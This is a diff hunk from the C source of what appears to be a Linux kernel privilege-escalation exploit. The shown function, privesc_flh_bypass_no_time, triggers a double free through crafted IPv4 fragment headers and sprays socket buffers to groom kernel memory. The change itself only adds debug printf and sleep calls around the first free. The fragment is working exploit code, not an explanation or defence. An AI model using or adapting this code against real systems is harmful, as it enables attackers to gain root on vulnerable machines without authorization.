@@ -313,11 +313,17 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 		alloc_ipv4_udp(1);
 	}
 
+	printf("some chill before 1st free");
+	sleep(1);
+
 	// allocate and free 1 skb from freelist
 	df_ip_header.ip_id = 0x1337;
 	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
 	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
 	trigger_double_free_hdr(32768 + 8, &df_ip_header);
+
+	printf("some chill after 1st free");
+	sleep(1);
 	
 	// push N skbs to skb freelist
 	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
